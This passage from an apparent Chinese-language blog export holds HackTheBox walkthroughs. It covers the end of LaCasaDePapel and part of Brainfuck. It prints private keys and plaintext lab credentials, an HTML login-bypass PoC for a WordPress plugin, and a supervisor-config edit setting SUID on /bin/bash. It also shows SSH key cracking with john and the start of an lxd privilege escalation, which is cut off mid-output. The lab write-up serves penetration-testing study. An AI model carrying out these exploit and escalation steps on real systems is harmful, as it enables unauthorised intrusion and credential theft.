/W3eGVQ6Xeyj/4kUENe1Q8xj9BIXLZJwXYHtACLS4PaKZSRaFSjkc/26/T2958f2oBqJLf +oxiydgcTI2vC34OYwwS7cOcSsS4HivUC6K7oJJHw3nUNoA2ge3cwiO6bNHrEKMJWOrMpp 9UH9BbQ/u7k5Ap7QF8yBfrdC64EAUzyZJXWde1NhSNjiI0rBqzCPZQGSOLEIFAwzU0bMIu Ju4JIQOAH+3tfoh8ccUdNcmfH7LaT7pF3VYwyoPMowLpA8fG4FXGyvoyrfeTXC6GY0+1NV UAAAdQRqG3BkahtwYAAAAHc3NoLXJzYQAAAgEAotH6Ygupi7JhjdbDXhg2f9xmzxaDNdxx EioAgH2GjUeUc4cJeTfU/yWg1vyx1dXqanfwAzYOQLUgO9/rDbI9y51rTQnLhHsp/iFiGd vDO5iZwLNrwmzVLxgGc+mNac3qxHcuHx7q+zQHB8NfU/qzyAL2/xsRkzBODRg21tsVqnTV 83T8CFSBUO2jzitHFNjvYbacP+Jn9Q5Y2HRdE03DWnAJJ7zk4SWWicM3riuuYyeqV6OYKb oHwi+FB94Yx1xaPFGP7T0jnBU3molURhKKolNqY78PE5qYplO/eO5H/7vKbrF7J5VtsVpv GQsmjqUhQK/GoYrMudIhcfQSMUnpgWXYtCnIpBa53aY/fl0XYpL9a1ZQh1iGm4oleVnZNv qMa4mb+8kC8k3WDmw9pq/W3eGVQ6Xeyj/4kUENe1Q8xj9BIXLZJwXYHtACLS4PaKZSRaFS jkc/26/T2958f2oBqJLf+oxiydgcTI2vC34OYwwS7cOcSsS4HivUC6K7oJJHw3nUNoA2ge 3cwiO6bNHrEKMJWOrMpp9UH9BbQ/u7k5Ap7QF8yBfrdC64EAUzyZJXWde1NhSNjiI0rBqz CPZQGSOLEIFAwzU0bMIuJu4JIQOAH+3tfoh8ccUdNcmfH7LaT7pF3VYwyoPMowLpA8fG4F XGyvoyrfeTXC6GY0+1NVUAAAADAQABAAACAAx3e25qai7yF5oeqZLY08NygsS0epNzL40u fh9YfSbwJiO6YTVQ2xQ2M1yCuLMgz/Qa/tugFfNKaw9qk7rWvPiMMx0Q9O5N5+c3cyV7uD Ul+A/TLRsT7jbO5h+V8Gf7hlBIt9VWLrPRRgCIKxJpDb7wyyy5S90zQ6apBfnpiH0muQMN IAcbQVOK/pHYqnakLaATtV8G3OLcmFzqe/3wZFbWYT0Tr4q1sBMYSXkiixW4gch4FDyNq+ 5oaQ0zKj6Jibc4n4aQudtHnJxOi49Z+Bd5v5mnlWXw3mNN4klGJWklXdif6kgbnuyHeh42 xlsBtcwYKWNRF1/bAQiSoZn4iNJqSFYcx9SzE+QadUfhtkbBiBC7HPHhANgmcg4FBJsz3f S4vJWkQvRd/wGjW+B6ywn6qrsJ1hSaoR9Tr7pwKfTKL1HyvMCWd5DEt98EWyyQUdHfKYgp E4oo6g2LX9c6bLawGvzFkVcfiH8XM0lyRpKV2hAU03KzNbbmy73HsxMBbVp0SMk62phRWw t8dQedPW8J71LR0igh8ckkuP13ZWPUUdTJJDc4UZycDzNruCj/8kPYn4Lo4s8E1XJ3y/F8 GQn2NvjjhkOgS+fMnQwfxPl3yDg4g/QgxOQ5b3yZwPVUM75IjperwQYXjzfY1XO5WtyGc7 5iUJMuSvXWukWAKJtBAAABAA+0Nxztrd02xlT+o9FRgUJ2CCed11eqAX2Lo2tpJB8G7e88 9OCz3YqRDAQSm4/1okhKPUj3B/bcZqOyRFbABZTJYOg0/m0Ag6Fb26S3TBMMrAgrSnxksZ 36KlW1WpuwrKq+4jSFJV5cPjpk9jVQmhvdgxHlSjIEpOkByOH4aKK7wuaIA5jqPKrq74cD mukNhpV4xjan1Rj7zPFLnoce0QMWdX4CShUa+BNInls8/v7MflLgxQ53I21cHXTdNf5zrc 48jlAJQuRiTSgIYSu+G1IIoLibVA/GPWOOJ2jmV0cpNzfbmGM/A2AEGvSKtuP9DwA1NHfn DDUIZds61tF9CxUAAAEBANVkFLByFDv9qnHymc/tr6dtqyyMY6D7YeU3ZWL+dNPSlSW/bN YjlA9S4aB2yuN+tAMeU0E6jKgh1+ROlNwXu48uN/QL50gZpiLcSlqZnhFQ/2El2Uvj2Y/S PnklDVQnQ/5yZBQR0bBiy/EJIOfJQo0KRbR/pq51eUhzBSEBMz6nBIY8zPdOVfhngZUpMe 4S7N1RPDWS2OvGwwWkwmmiJe45cGD7SKLj0Jv+p/DZ+k9ZiI5tEGY87DKAh0wrV04u4I/l xGl6TCoXDr7hi1dAdVWW84cj8mFW7q9UN0y15Vn82HPIq5ZaSKfM6qPKfYeBBaN8hUIogf +FlwHjzSWOPb0AAAEBAMNU3uGeUUMVn1dUOMeemr+LJVHHjtqbL3oq97+fd1ZQ6vchTyKX 6cbCC7gB13qJ6oWO1GhB9e4SAd3DYiNv/LO9z1886DyqNLVHKYXn0SNSLTPb7n9NjwJNz1 GuPqW43pGwlBhMPZhJPA+4wmiO9GV+GXlaFrz16Or/qCexGyovMIhKtV0Ks3XzHhhjG41e gKd/wGl3vV74pTWIyS2Nrtilb7ii8jd2MezuSTf7SmjiE0GPY8xt0ZqVq+/Fj/vfM+vbN1 ram9k+oABmLisVVgkKvfbzWRmGMDfG2X0jOrIw52TZn9MwTcr+oMyi1RTG7oabPl6cNM0x X3a0iF5JE3kAAAAYYmVybGluQGxhY2FzYWRlcGFwZWwuaHRiAQID -----END OPENSSH PRIVATE KEY----- 成功获取到了密钥 ┌──(root㉿kali)-[~/Desktop] └─# ssh berlin@10.10.10.131 -i id_rsa berlin@10.10.10.131&#39;s password: 但是这里使用 berlin 账户登录却不行 ┌──(root㉿kali)-[~/Desktop] └─# ssh professor@10.10.10.131 -i id_rsa _ ____ ____ ____ _ | | __ _ / ___|__ _ ___ __ _ | _ \\ ___ | _ \\ __ _ _ __ ___| | | | / _` | | | / _` / __|/ _` | | | | |/ _ \\ | |_) / _` | &#39;_ \\ / _ \\ | | |__| (_| | | |__| (_| \\__ \\ (_| | | |_| | __/ | __/ (_| | |_) | __/ | |_____\\__,_| \\____\\__,_|___/\\__,_| |____/ \\___| |_| \\__,_| .__/ \\___|_| |_| lacasadepapel [~]$ whoami&amp;&amp;id professor uid=1002(professor) gid=1002(professor) groups=1002(professor) 最后使用 professor 用户倒是成功进去了 权限提升lacasadepapel [~]$ ls -la total 24 drwxr-sr-x 4 professor professor 4096 Mar 6 2019 . drwxr-xr-x 7 root root 4096 Feb 16 2019 .. lrwxrwxrwx 1 root professor 9 Nov 6 2018 .ash_history -&gt; /dev/null drwx------ 2 professor professor 4096 Jan 31 2019 .ssh -rw-r--r-- 1 root root 88 Jan 29 2019 memcached.ini -rw-r----- 1 root nobody 434 Jan 29 2019 memcached.js drwxr-sr-x 9 root professor 4096 Oct 3 13:13 node_modules 这边看到有一个 memcached.ini 的文件，是属于 root 的，但是在我们的目录，那和肯定是有关的，恰巧我们有读取权限，去看一下内容 lacasadepapel [~]$ cat memcached.ini [program:memcached] command = sudo -u nobody /usr/bin/node /home/professor/memcached.js 会使用 sudo 权限调用 nobody 用户使用 node 执行 memcached.js 文件？这套娃有点厉害 但是我们没有编辑权限，那么怎么办呢？直接给它删掉自己创建一个吧 [program:memcached] command = chmod +s /bin/bash lacasadepapel [~]$ ls -la /bin/bash -rwxr-xr-x 1 root root 715008 May 1 2018 /bin/bash lacasadepapel [~]$ ls -la /bin/bash -rwsr-sr-x 1 root root 715008 May 1 2018 /bin/bash 稍等一会儿后，我们要的效果来了，提权去 lacasadepapel [~]$ /bin/bash -p lacasadepapel [~]$ whoami&amp;&amp;id root uid=1002(professor) gid=1002(professor) euid=0(root) egid=0(root) groups=0(root),1002(professor) 成功提权到 root 权限 lacasadepapel [~]$ cat /home/berlin/user.txt f61519de2e8afee5a22f8de3a88a0e6b lacasadepapel [~]$ cat /root/root.txt 113f5e20d75aca2331511cdbe6319613 成功拿到 user 权限和 root 权限的 flag 文件","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Brainfuck - Hackthebox","slug":"Hackthebox/Insane/Hackthebox-Brainfuck","date":"2017-04-29T11:38:36.000Z","updated":"2023-06-17T02:37:19.000Z","comments":true,"path":"2017/04/29/Hackthebox/Insane/Hackthebox-Brainfuck/","link":"","permalink":"http://www.lucifiel.com/2017/04/29/Hackthebox/Insane/Hackthebox-Brainfuck/","excerpt":"","text":"Hackthebox - Brainfuck靶场信息 靶场类型 信息收集Nmap┌──(root㉿kali)-[~/Desktop] └─# nmap -sS -sV -A -sC -p- --min-rate 10000 10.10.10.17 Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-19 01:49 CST Nmap scan report for 10.10.10.17 Host is up (0.41s latency). Not shown: 65530 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 94d0b334e9a537c5acb980df2a54a5f0 (RSA) | 256 6bd5dc153a667af419915d7385b24cb2 (ECDSA) |_ 256 23f5a333339d76d5f2ea6971e34e8e02 (ED25519) 25/tcp open smtp Postfix smtpd |_smtp-commands: brainfuck, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN 110/tcp open pop3 Dovecot pop3d |_pop3-capabilities: SASL(PLAIN) USER TOP AUTH-RESP-CODE CAPA RESP-CODES PIPELINING UIDL 143/tcp open imap Dovecot imapd |_imap-capabilities: SASL-IR ENABLE LITERAL+ LOGIN-REFERRALS more listed ID capabilities have post-login Pre-login AUTH=PLAINA0001 IMAP4rev1 OK IDLE 443/tcp open ssl/http nginx 1.10.0 (Ubuntu) |_http-title: Welcome to nginx! |_http-server-header: nginx/1.10.0 (Ubuntu) | tls-nextprotoneg: |_ http/1.1 | tls-alpn: |_ http/1.1 | ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR | Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb | Not valid before: 2017-04-13T11:19:29 |_Not valid after: 2027-04-11T11:19:29 |_ssl-date: TLS randomness does not represent time Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.12 (92%), Linux 3.13 (92%), Linux 3.13 or 4.2 (92%), Linux 3.16 (92%), Linux 3.16 - 4.6 (92%), Linux 3.2 - 4.9 (92%), Linux 3.8 - 3.11 (92%), Linux 4.2 (92%), Linux 4.4 (92%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops Service Info: Host: brainfuck; OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 110/tcp) HOP RTT ADDRESS 1 482.21 ms 10.10.16.1 2 482.26 ms 10.10.10.17 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 88.32 seconds DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb 这边又两个域名，先加入 hosts 解析吧 echo 10.10.10.17 brainfuck.htb www.brainfuck.htb sup3rs3cr3t.brainfuck.htb &gt;&gt; /etc/hosts Http 直接访问是 Nginx 默认页面 使用 hosts 解析后访问是一个 wordpress 页面，版本是 4.7.3 这里的内容是 SMTP 集成已准备就绪吗，然后给了我们一个邮件地址，让我们检查后把反馈发送到这个地址 orestis@brainfuck.htb SMTP 使用的端口是 25 端口，这里先记录一下，说不定有用 既然知道是 wordpress 了，那就用 wpscan 去扫描一下 Wpscan┌──(root㉿kali)-[~/Desktop] └─# wpscan --url &quot;https://brainfuck.htb/&quot; --disable-tls-checks _______________________________________________________________ __ _______ _____ \\ \\ / / __ \\ / ____| \\ \\ /\\ / /| |__) | (___ ___ __ _ _ __ ® \\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | &#39;_ \\ \\ /\\ / | | ____) | (__| (_| | | | | \\/ \\/ |_| |_____/ \\___|\\__,_|_| |_| WordPress Security Scanner by the WPScan Team Version 3.8.22 Sponsored by Automattic - https://automattic.com/ @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart _______________________________________________________________ [+] URL: https://brainfuck.htb/ [10.10.10.17] [+] Started: Thu Jan 19 02:01:26 2023 Interesting Finding(s): [+] wp-support-plus-responsive-ticket-system | Location: https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/ | Last Updated: 2019-09-03T07:57:00.000Z | [!] The version is out of date, the latest version is 9.1.2 | | Found By: Urls In Homepage (Passive Detection) | | Version: 7.1.3 (80% confidence) | Found By: Readme - Stable Tag (Aggressive Detection) | - https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt 发现一个老版本插件 https://www.exploit-db.com/exploits/41006 搜索这个插件找到了一个可利用的漏洞 漏洞利用&lt;form method=&quot;post&quot; action=&quot;https://brainfuck.htb/wp-admin/admin-ajax.php&quot;&gt; Username: &lt;input type=&quot;text&quot; name=&quot;username&quot; value=&quot;admin&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;orestis@brainfuck.htb&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;action&quot; value=&quot;loginGuestFacebook&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;Login&quot;&gt; &lt;/form&gt; 将我们的 poc 保存到本地，然后使用 python3 开启一个 http 服务 python3 -m http.server 80 选择登录试试 点击后是一片空白页面，不确定是否利用成功，返回主页看看 ok，这里我们利用成功了，已经成功登录 在 Settings -&gt; Easy WP SMTP 中，可以看到 SMTP 的信息，这里密码是隐藏的 使用控制台就可以看到密码 SMTP Email = orestis@brainfuck.htb username = orestis password = kHGuERB29DNiNE ┌──(root㉿kali)-[~/Desktop] └─# nc 10.10.10.17 110 +OK Dovecot ready. USER orestis +OK PASS kHGuERB29DNiNE +OK Logged in. list +OK 2 messages: 1 977 2 514 . retr 1 +OK 977 octets Return-Path: &lt;www-data@brainfuck.htb&gt; X-Original-To: orestis@brainfuck.htb Delivered-To: orestis@brainfuck.htb Received: by brainfuck (Postfix, from userid 33) id 7150023B32; Mon, 17 Apr 2017 20:15:40 +0300 (EEST) To: orestis@brainfuck.htb Subject: New WordPress Site X-PHP-Originating-Script: 33:class-phpmailer.php Date: Mon, 17 Apr 2017 17:15:40 +0000 From: WordPress &lt;wordpress@brainfuck.htb&gt; Message-ID: &lt;00edcd034a67f3b0b6b43bab82b0f872@brainfuck.htb&gt; X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer) MIME-Version: 1.0 Content-Type: text/plain; charset=UTF-8 Your new WordPress site has been successfully set up at: https://brainfuck.htb You can log in to the administrator account with the following information: Username: admin Password: The password you chose during the install. Log in here: https://brainfuck.htb/wp-login.php We hope you enjoy your new site. Thanks! --The WordPress Team https://wordpress.org/ . retr 2 +OK 514 octets Return-Path: &lt;root@brainfuck.htb&gt; X-Original-To: orestis Delivered-To: orestis@brainfuck.htb Received: by brainfuck (Postfix, from userid 0) id 4227420AEB; Sat, 29 Apr 2017 13:12:06 +0300 (EEST) To: orestis@brainfuck.htb Subject: Forum Access Details Message-Id: &lt;20170429101206.4227420AEB@brainfuck&gt; Date: Sat, 29 Apr 2017 13:12:06 +0300 (EEST) From: root@brainfuck.htb (root) Hi there, your credentials for our &quot;secret&quot; forum are below :) username: orestis password: kIEnnfEKJ#9UmdO Regards . 得到了两封邮件 Return-Path: &lt;www-data@brainfuck.htb&gt; X-Original-To: orestis@brainfuck.htb Delivered-To: orestis@brainfuck.htb Received: by brainfuck (Postfix, from userid 33) id 7150023B32; Mon, 17 Apr 2017 20:15:40 +0300 (EEST) To: orestis@brainfuck.htb Subject: New WordPress Site X-PHP-Originating-Script: 33:class-phpmailer.php Date: Mon, 17 Apr 2017 17:15:40 +0000 From: WordPress &lt;wordpress@brainfuck.htb&gt; Message-ID: &lt;00edcd034a67f3b0b6b43bab82b0f872@brainfuck.htb&gt; X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer) MIME-Version: 1.0 Content-Type: text/plain; charset=UTF-8 Your new WordPress site has been successfully set up at: https://brainfuck.htb You can log in to the administrator account with the following information: Username: admin Password: The password you chose during the install. Log in here: https://brainfuck.htb/wp-login.php We hope you enjoy your new site. Thanks! --The WordPress Team https://wordpress.org/ Return-Path: &lt;root@brainfuck.htb&gt; X-Original-To: orestis Delivered-To: orestis@brainfuck.htb Received: by brainfuck (Postfix, from userid 0) id 4227420AEB; Sat, 29 Apr 2017 13:12:06 +0300 (EEST) To: orestis@brainfuck.htb Subject: Forum Access Details Message-Id: &lt;20170429101206.4227420AEB@brainfuck&gt; Date: Sat, 29 Apr 2017 13:12:06 +0300 (EEST) From: root@brainfuck.htb (root) Hi there, your credentials for our &quot;secret&quot; forum are below :) username: orestis password: kIEnnfEKJ#9UmdO Regards 得到了一个账号密码 username: orestis password: kIEnnfEKJ#9UmdO sup3rs3cr3t.brainfuck.htb我们看一下另一个地址是什么东西 似乎是一个论坛 用我们刚才的账号密码去登录试试 成功登录 这里的对话有点意思，就是有个人骂管理员，赶快把密钥发给我。管理员说，你个小碧池，我看你一点礼貌都没有，信不信我把密钥贴在这里给大家下载。然后那个人说他开了一个新的加密通话的帖子 密码解密我们可以看到，对话已经被加密了，然后我找了一个解密的网站 https://planetcalc.com/2468/ brainfu - ckmybra inf uck myb rainfu 然后我们先删除所有的特殊字符 brainfuckmybrainfuckmybrainfu 我们去尝试解密，可以确定的是 mnvze://zsrivszwm.rfz/8cr5ai10r915218697i1w658enqc0cs8/ozrxnkc/ub_sja 这一段肯定是一个网址，所以我们看看这一段密码怎么解密才能让它变成网址 fuckmybrain https://brainfuck.htb/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa 最后得出了密钥和地址 私钥解密┌──(root㉿kali)-[~/Desktop] └─# cat id_rsa -----BEGIN RSA PRIVATE KEY----- Proc-Type: 4,ENCRYPTED DEK-Info: AES-128-CBC,6904FEF19397786F75BE2D7762AE7382 mneag/YCY8AB+OLdrgtyKqnrdTHwmpWGTNW9pfhHsNz8CfGdAxgchUaHeoTj/rh/ B2nS4+9CYBK8IR3Vt5Fo7PoWBCjAAwWYlx+cK0w1DXqa3A+BLlsSI0Kws9jea6Gi W1ma/V7WoJJ+V4JNI7ufThQyOEUO76PlYNRM9UEF8MANQmJK37Md9Ezu53wJpUqZ 7dKcg6AM/o9VhOlpiX7SINT9dRKaKevOjopRbyEFMliP01H7ZlahWPdRRmfCXSmQ zxH9I2lGIQTtRRA3rFktLpNedNPuZQCSswUec7eVVt2mc2Zv9PM9lCTJuRSzzVum oz3XEnhaGmP1jmMoVBWiD+2RrnL6wnz9kssV+tgCV0mD97WS+1ydWEPeCph06Mem dLR2L1uvBGJev8i9hP3thp1owvM8HgidyfMC2vOBvXbcAA3bDKvR4jsz2obf5AF+ Fvt6pmMuix8hbipP112Us54yTv/hyC+M5g1hWUuj5y4xovgr0LLfI2pGe+Fv5lXT mcznc1ZqDY5lrlmWzTvsW7h7rm9LKgEiHn9gGgqiOlRKn5FUl+DlfaAMHWiYUKYs LSMVvDI6w88gZb102KD2k4NV0P6OdXICJAMEa1mSOk/LS/mLO4e0N3wEX+NtgVbq ul9guSlobasIX5DkAcY+ER3j+/YefpyEnYs+/tfTT1oM+BR3TVSlJcOrvNmrIy59 krKVtulxAejVQzxImWOUDYC947TXu9BAsh0MLoKtpIRL3Hcbu+vi9L5nn5LkhO/V gdMyOyATor7Amu2xb93OO55XKkB1liw2rlWg6sBpXM1WUgoMQW50Keo6O0jzeGfA VwmM72XbaugmhKW25q/46/yL4VMKuDyHL5Hc+Ov5v3bQ908p+Urf04dpvj9SjBzn schqozogcC1UfJcCm6cl+967GFBa3rD5YDp3x2xyIV9SQdwGvH0ZIcp0dKKkMVZt UX8hTqv1ROR4Ck8G1zM6Wc4QqH6DUqGi3tr7nYwy7wx1JJ6WRhpyWdL+su8f96Kn F7gwZLtVP87d8R3uAERZnxFO9MuOZU2+PEnDXdSCSMv3qX9FvPYY3OPKbsxiAy+M wZezLNip80XmcVJwGUYsdn+iB/UPMddX12J30YUbtw/R34TQiRFUhWLTFrmOaLab Iql5L+0JEbeZ9O56DaXFqP3gXhMx8xBKUQax2exoTreoxCI57axBQBqThEg/HTCy IQPmHW36mxtc+IlMDExdLHWD7mnNuIdShiAR6bXYYSM3E725fzLE1MFu45VkHDiF mxy9EVQ+v49kg4yFwUNPPbsOppKc7gJWpS1Y/i+rDKg8ZNV3TIb5TAqIqQRgZqpP CvfPRpmLURQnvly89XX97JGJRSGJhbACqUMZnfwFpxZ8aPsVwsoXRyuub43a7GtF 9DiyCbhGuF2zYcmKjR5EOOT7HsgqQIcAOMIW55q2FJpqH1+PU8eIfFzkhUY0qoGS EBFkZuCPyujYOTyvQZewyd+ax73HOI7ZHoy8CxDkjSbIXyALyAa7Ip3agdtOPnmi 6hD+jxvbpxFg8igdtZlh9PsfIgkNZK8RqnPymAPCyvRm8c7vZFH4SwQgD5FXTwGQ -----END RSA PRIVATE KEY----- 然后我们得到了私钥，但是似乎是加密的，我们还不能直接使用 ┌──(root㉿kali)-[~/Desktop] └─# ssh2john id_rsa &gt; id_rsa_decode ┌──(root㉿kali)-[~/Desktop] └─# john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_decode Using default input encoding: UTF-8 Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64]) Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes Cost 2 (iteration count) is 1 for all loaded hashes Will run 4 OpenMP threads Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status 3poulakia! (id_rsa) 1g 0:00:00:03 DONE (2023-01-19 15:20) 0.3095g/s 3857Kp/s 3857Kc/s 3857KC/s 3prash0..3pornuthin Use the &quot;--show&quot; option to display all of the cracked passwords reliably Session completed. 得到了私钥的密码 3poulakia! ┌──(root㉿kali)-[~/Desktop] └─# ssh orestis@10.10.10.17 -i id_rsa Enter passphrase for key &#39;id_rsa&#39;: Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-75-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage 0 packages can be updated. 0 updates are security updates. You have mail. Last login: Mon Oct 3 19:41:38 2022 from 10.10.14.23 orestis@brainfuck:~$ id&amp;&amp;whoami orestis@brainfuck:~$ whoami&amp;&amp;id orestis uid=1000(orestis) gid=1000(orestis) groups=1000(orestis),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),121(lpadmin),122(sambashare) 成功得到 user 权限 orestis@brainfuck:~$ cat user.txt 2c11cfbc5b959f73ac15a3310bd097c9 成功得到 user 权限的 flag 文件 权限提升通过上面的 id 我们可以看到，当前用户在 lxd 权限组中 https://www.exploit-db.com/exploits/46978 通过搜索 lxd 找到了一个 exploit Step 1┌──(root㉿kali)-[~/Desktop] └─# wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine --2023-01-19 15:28:34-- https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine 正在解析主机 raw.githubusercontent.com (raw.githubusercontent.com)... 2606:50c0:8003::154, 2606:50c0:8000::154, 2606:50c0:8002::154, ... 正在连接 raw.githubusercontent.com (raw.githubusercontent.com)|2606:50c0:8003::154|:443... 已连接。 已发出 HTTP 请求，正在等待回应... 200 OK 长度：8060 (7.9K) [text/plain] 正在保存至: “build-alpine” build-alpine 100%[=====================================================================================================================&gt;] 7.87K --.-KB/s 用时 0s 2023-01-19 15:28:35 (27.1 MB/s) - 已保存 “build-alpine” [8060/8060]) 首先下载 build-alpine Step 2接着运行 ┌──(root㉿kali)-[~/Desktop] └─# ./build-alpine Determining the latest release... v3.17 Using static apk from http://dl-cdn.alpinelinux.org/alpine//v3.17/main/x86_64 Downloading alpine-keys-2.4-r1.apk tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’ tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’ tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’ tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’ tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’ tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’ tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’ tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’ tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’ tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’ tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’ tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’ tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’ tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’ tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’ tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’ tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’ tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’ tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’ tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’ tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’ tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’ tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’ tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’ tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’ tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’ tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’ tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’ tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’ tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’ tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’ tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’ tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’ tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’ tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’ tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’ tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’ tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’ tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’ tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’ tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’ Downloading apk-tools-static-2.12.10-r1.apk tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’ tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’ alpine-devel@lists.alpinelinux.org-6165ee59.rsa.pub: 成功 Verified OK % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 2527 100 2527 0 0 740 0 0:00:03 0:00:03 --:--:-- 741 --2023-01-19 15:38:57-- http://alpine.mirror.wearetriple.com/MIRRORS.txt 正在解析主机 alpine.mirror.wearetriple.com (alpine.mirror.wearetriple.com)... 2a00:1f00:dc06:10::106, 93.187.10.106 正在连接 alpine.mirror.wearetriple.com (alpine.mirror.wearetriple.com)|2a00:1f00:dc06:10::106|:80... 已连接。 已发出 HTTP 请求，正在等待回应... 200 OK 长度：2527 (2.5K) [text/plain] 正在保存至: “/root/Desktop/rootfs/usr/share/alpine-mirrors/MIRRORS.txt” /root/Desktop/rootfs/usr/share/alpine-mirrors/MIRROR 100%[=====================================================================================================================&gt;] 2.47K --.-KB/s 用时 0s 2023-01-19 15:39:00 (77.3 MB/s) - 已保存 “/root/Desktop/rootfs/usr/share/alpine-mirrors/MIRRORS.txt” [2527/2527]) Selecting mirror http://mirror.clarkson.edu/alpine//v3.17/main fetch http://mirror.clarkson.edu/alpine//v3.17/main/x86_64/APKINDEX.tar.gz (1/25) Installing alpine-baselayout-data (3.4.0-r0) (2/25) Installing musl (1.2.3-r4) (3/25) Installing busybox (1.35.0-r29) Executing busybox-1.35.0-r29.post-install (4/25) Installing busybox-binsh (1.35.0-r29) (5/25) Installing alpine-baselayout (3.4.0-r0) Executing alpine-baselayout-3.4.0-r0.pre-install Executing alpine-baselayout-3.4.0-r0.post-install (6/25) Installing ifupdown-ng (0.12.1-r1) (7/25) Installing libcap2 (2.66-r0) (8/25) Installing openrc (0.45.2-r7) Executing openrc-0.45.2-r7.post-install (9/25) Installing mdev-conf (4.3-r0) (10/25) Installing busybox-mdev-openrc (1.35.0-r29) (11/25) Installing alpine-conf (3.15.0-r0) (12/25) Installing alpine-keys (2.4-r1) (13/25) Installing alpine-release (3.17.1-r0) (14/25) Installing ca-certificates-bundle (20220614-r4) (15/25) Installing libcrypto3 (3.0.7-r2) (16/25) Installing libssl3 (3.0.7-r2) (17/25) Installing ssl_client (1.35.0-r29) (18/25) Installing zlib (1.2.13-r0) (19/25) Installing apk-tools (2.12.10-r1) (20/25) Installing busybox-openrc (1.35.0-r29) (21/25) Installing busybox-suid (1.35.0-r29) (22/25) Installing scanelf (1.3.5-r1) 